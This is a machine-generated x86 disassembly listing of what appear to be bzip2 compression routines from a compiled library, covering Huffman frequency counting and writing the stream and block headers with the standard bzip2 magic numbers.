mov [ ebp - 0x18 ] 0x3b9ac9ff
jle r-xdata
inc edx
cmp edx 0x10
jl r-xdata
mov [ eax ] 0x1
push [ ebp - 0x34 ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push edi
push [ ebp - 0x18 ]
call sub_1000b81e
add [ ebp - 0x18 ] 0x408
add esp 0x14
add edi 0x102
dec [ ebp - 0x38 ]
jne r-xdata
movzx eax [ edi + ecx ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov dl [ ebp - 0xc ]
mov al [ edi - 0x4652 ]
xor ecx ecx
mov [ ebp - 0x2d ] dl
cmp al dl
je r-xdata
mov ecx [ ebp - 0x18 ]
inc ecx
cmp ecx [ ebp - 0x24 ]
movzx ecx cx
lea ecx [ ecx + esi + 0x9324 ]
inc [ ebp + ecx * 4 - 0x54 ]
mov edx [ ebp - 0x2c ]
inc [ ebp - 0x2c ]
cmp [ ebp - 0x28 ] 0x6
mov [ esi + edx + 0x680 ] cl
jne r-xdata
mov edx [ ebp - 0x1c ]
movzx edx [ ebp + edx * 2 - 0x10 ]
cmp edx [ ebp - 0x18 ]
jge r-xdata
cmp [ edx + edi ] 0x0
je r-xdata
inc ecx
add edi 0x10
cmp ecx 0x10
jl r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ecx
mov [ ebp - 0x24 ] 0x20
mov [ ebp - 0x20 ] ecx
jle r-xdata
cmp eax [ ebp - 0x24 ]
jge r-xdata
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
movzx di [ ecx ]
lea edx [ ebp + edx * 2 - 0x10 ]
add [ edx ] di
inc [ ebp - 0x1c ]
mov edx [ ebp - 0x1c ]
add ecx 0x102
cmp edx [ ebp - 0x28 ]
jl r-xdata
cmp eax [ ebp - 0x24 ]
jg r-xdata
mov edx [ ebp - 0x24 ]
sub edx eax
inc edx
cmp edx 0x32
jne r-xdata
inc [ ebp - 0x1c ]
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x28 ]
jl r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
lea eax [ ebp + ecx - 0x14 ]
mov [ eax ] 0x0
xor edx edx
xor edi edi
inc ecx
cmp ecx [ ebp - 0x34 ]
jl r-xdata
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov ecx [ esi + 0x274 ]
inc eax
cmp eax ecx
mov [ ebp - 0x1c ] eax
jl r-xdata
add ecx 0x2c
imul ecx ecx 0x102
movzx edx [ ebx + eax * 2 ]
add ecx 0x2c
imul ecx ecx 0x102
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x6 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x8 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xa ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xc ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xe ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x10 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x12 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x14 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x16 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x18 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x20 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x22 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x24 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x26 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x28 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x30 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x32 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x34 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x36 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x38 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x40 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x42 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x44 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x46 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x48 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x50 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x52 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x54 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x56 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x58 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx eax [ ebx + eax * 2 + 0x60 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
mov eax [ ebp - 0x20 ]
movzx eax [ ebx + eax * 2 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
jmp r-xdata
push 0x1
inc ecx
push ecx
jmp r-xdata
movzx edx [ ebx + eax * 2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
inc eax
cmp eax [ ebp - 0x24 ]
jle r-xdata
xor ecx ecx
mov eax esi
cmp [ ebp + edi - 0x14 ] cl
je r-xdata
and [ ebp - 0x18 ] 0x0
lea eax [ esi + 0x58 ]
mov [ ebp - 0x20 ] eax
call sub_10007c4f
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x20 ] 0x10
cmp [ ebp - 0x18 ] 0x10
jl r-xdata
xor edi edi
mov eax [ ebp - 0x18 ]
cmp [ ebp + eax - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0x28 ]
push 0x3
mov eax esi
call sub_10007c4f
mov ecx [ ebp - 0x2c ]
push 0xf
call sub_10007c4f
cmp [ ebp - 0x2c ] 0x0
pop ecx
pop ecx
jle r-xdata
push 0x1
inc ecx
push ecx
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
xor ecx ecx
cmp [ edi + eax ] cl
mov eax esi
je r-xdata
call sub_10007c4f
inc edi
cmp edi 0x10
pop ecx
jl r-xdata
mov eax [ esi + 0x274 ]
xor ecx ecx
cmp eax ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
jle r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
push 0x1
xor ecx ecx
mov eax esi
call sub_10007c4f
inc edi
dec [ ebp - 0x38 ]
pop ecx
jne r-xdata
xor ecx ecx
inc ecx
push ecx
mov eax esi
call sub_10007c4f
movzx eax [ edi ]
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] eax
pop ecx
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
leave
retn
lea edx [ esi + 0x680 ]
mov [ ebp - 0x34 ] edx
add [ ebp - 0x2c ] 0x102
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
mov edi [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
jmp r-xdata
and [ ebp - 0x20 ] 0x0
cmp [ edi ] 0x0
jbe r-xdata
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
lea edi [ eax - 0x1 ]
mov [ ebp - 0x24 ] edi
mov eax [ ebp - 0x2c ]
movzx ecx [ eax ]
push 0x5
mov eax esi
mov [ ebp - 0x24 ] ecx
call sub_10007c4f
cmp [ ebp - 0x34 ] 0x0
pop ecx
jle r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x24 ] eax
jl r-xdata
cmp ecx edi
mov [ ebp - 0x18 ] ecx
jg r-xdata
mov eax edi
sub eax ecx
inc eax
cmp eax 0x32
jne r-xdata
push 0x2
pop ecx
push ecx
mov eax esi
call sub_10007c4f
inc [ ebp - 0x24 ]
pop ecx
jmp r-xdata
inc [ ebp - 0x2c ]
mov eax [ esi + 0x274 ]
inc [ ebp - 0x34 ]
lea ecx [ edi + 0x1 ]
cmp ecx eax
mov [ ebp - 0x1c ] ecx
jl r-xdata
mov eax [ ebp - 0x34 ]
movzx eax [ eax ]
mov ecx [ ebp - 0x18 ]
movzx ecx [ ebx + ecx * 2 ]
lea edx [ eax + 0x26 ]
add eax 0x92
imul edx edx 0x102
imul eax eax 0x102
add eax ecx
movzx eax [ eax + esi ]
add edx ecx
mov ecx [ esi + edx * 4 ]
push eax
mov eax esi
call sub_10007c4f
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] edi
pop ecx
jle r-xdata
mov eax [ ebp - 0x2c ]
movzx eax [ eax + esi + 0x680 ]
mov ecx [ ebp - 0x1c ]
movzx ecx [ ebx + ecx * 2 ]
lea edi [ eax + 0x92 ]
add eax 0x26
imul edi edi 0x102
imul eax eax 0x408
add edi esi
movzx edx [ ecx + edi ]
add eax esi
mov ecx [ eax + ecx * 4 ]
mov [ ebp - 0x18 ] eax
push edx
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x2 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x4 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x6 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x8 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0xa ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0xc ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0xe ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x10 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x12 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x14 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x16 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x18 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x1a ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x1c ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x1e ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x20 ]
movzx ecx [ eax + edi ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x22 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x24 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x26 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x28 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x2a ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x2c ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x2e ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x30 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x32 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x34 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x36 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x38 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x3a ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x3c ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x3e ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x40 ]
movzx ecx [ eax + edi ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x42 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x44 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x46 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x48 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x4a ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x4c ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x4e ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x50 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x52 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x54 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x56 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x58 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x5a ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x5c ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x5e ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x1c ]
movzx eax [ ebx + eax * 2 + 0x60 ]
movzx ecx [ eax + edi ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov eax [ ebp - 0x20 ]
movzx eax [ ebx + eax * 2 ]
movzx ecx [ eax + edi ]
push ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_10007c4f
mov edi [ ebp - 0x24 ]
pop ecx
pop ecx
jmp r-xdata
movzx eax [ edi ]
cmp [ ebp - 0x24 ] eax
mov eax esi
jg r-xdata
lea edi [ ecx + 0x31 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x24 ] edi
jl r-xdata
push 0x2
push 0x3
pop ecx
call sub_10007c4f
dec [ ebp - 0x24 ]
pop ecx
push 0x1
xor ecx ecx
call sub_10007c4f
inc edi
dec [ ebp - 0x38 ]
pop ecx
jne r-xdata
sub_10009541
push ebx
push esi
mov esi [ esp + 0xc ]
cmp [ esi + 0x44 ] 0x0
jle r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x44 ]
cmp [ esi + 0x26c ] 0x1
mov [ esi + 0x2c ] eax
jne r-xdata
lea eax [ esi + 0x260 ]
mov ecx [ eax ]
not ecx
mov [ eax ] ecx
lea eax [ esi + 0x264 ]
mov edx [ eax ]
rol edx 0x1
xor edx ecx
cmp [ esi + 0x26c ] 0x1
mov [ eax ] edx
jle r-xdata
cmp [ esi + 0x44 ] 0x0
jle r-xdata
push esi
call sub_10007c06
add esp 0x4
mov cl 0x42
mov eax esi
call sub_10007ce7
mov cl 0x5a
call sub_10007ce7
mov cl 0x68
call sub_10007ce7
mov cl [ esi + 0x270 ]
add cl 0x30
call sub_10007ce7
push esi
call sub_1000cb92
pop ecx
and [ esi + 0x4c ] 0x0
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov cl 0x31
mov eax esi
call sub_10007ce7
mov cl 0x41
call sub_10007ce7
mov cl 0x59
call sub_10007ce7
mov cl 0x26
call sub_10007ce7
mov cl 0x53
call sub_10007ce7
mov cl 0x59
call sub_10007ce7
mov ebx [ esi + 0x260 ]
call sub_10007caa
push 0x1
xor ecx ecx
call sub_10007c4f
mov ecx [ esi + 0x1c ]
push 0x18
call sub_10007c4f
pop ecx
pop ecx
call sub_10007d17
call sub_10007e93
pop esi
pop ebx
retn
mov cl 0x17
mov eax esi
call sub_10007ce7
mov cl 0x72
call sub_10007ce7
mov cl 0x45
call sub_10007ce7
mov cl 0x38
call sub_10007ce7
mov cl 0x50
call sub_10007ce7
mov cl 0x90
call sub_10007ce7
mov ebx [ esi + 0x264 ]
call sub_10007caa
pop esi
pop ebx
jmp sub_10007c19
sub_1000968f
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0x4 ]
push esi
mov esi [ ebx ]
xor eax eax
push edi
cmp ecx 0xa
jne r-xdata
mov edx [ ebx + 0xfa14 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebx + 0xfa18 ]
mov [ ebp - 0x1c ] edx
mov edx [ ebx + 0xfa1c ]
mov [ ebp - 0x40 ] edx
mov edx [ ebx + 0xfa20 ]
mov [ ebp - 0x60 ] edx
mov edx [ ebx + 0xfa24 ]
mov [ ebp - 0x3c ] edx
mov edx [ ebx + 0xfa28 ]
mov [ ebp - 0x54 ] edx
mov edx [ ebx + 0xfa2c ]
mov [ ebp - 0x64 ] edx
mov edx [ ebx + 0xfa30 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebx + 0xfa34 ]
mov [ ebp - 0x28 ] edx
mov edx [ ebx + 0xfa38 ]
mov [ ebp - 0x48 ] edx
mov edx [ ebx + 0xfa3c ]
mov [ ebp - 0x30 ] edx
mov edx [ ebx + 0xfa40 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebx + 0xfa44 ]
mov [ ebp - 0x20 ] edx
mov edx [ ebx + 0xfa48 ]
mov [ ebp - 0x70 ] edx
mov edx [ ebx + 0xfa4c ]
mov [ ebp - 0x34 ] edx
mov edx [ ebx + 0xfa50 ]
mov [ ebp - 0x80 ] edx
mov edx [ ebx + 0xfa54 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebx + 0xfa58 ]
mov [ ebp - 0x2c ] edx
mov edx [ ebx + 0xfa5c ]
mov [ ebp - 0x74 ] edx
mov edx [ ebx + 0xfa60 ]
mov [ ebp - 0x6c ] edx
mov edx [ ebx + 0xfa64 ]
mov [ ebp - 0x5c ] edx
mov edx [ ebx + 0xfa68 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebx + 0xfa6c ]
mov [ ebp - 0x44 ] edx
mov edx [ ebx + 0xfa70 ]
add ecx 0xfffffff6
mov [ ebp - 0x50 ] edx
cmp ecx 0x28
ja r-xdata
mov [ ebx + 0xfa14 ] eax
mov [ ebx + 0xfa18 ] eax
mov [ ebx + 0xfa1c ] eax
mov [ ebx + 0xfa20 ] eax
mov [ ebx + 0xfa24 ] eax
mov [ ebx + 0xfa28 ] eax
mov [ ebx + 0xfa2c ] eax
mov [ ebx + 0xfa30 ] eax
mov [ ebx + 0xfa34 ] eax
mov [ ebx + 0xfa38 ] eax
mov [ ebx + 0xfa3c ] eax
mov [ ebx + 0xfa40 ] eax
mov [ ebx + 0xfa44 ] eax
mov [ ebx + 0xfa48 ] eax
mov [ ebx + 0xfa4c ] eax
mov [ ebx + 0xfa50 ] eax
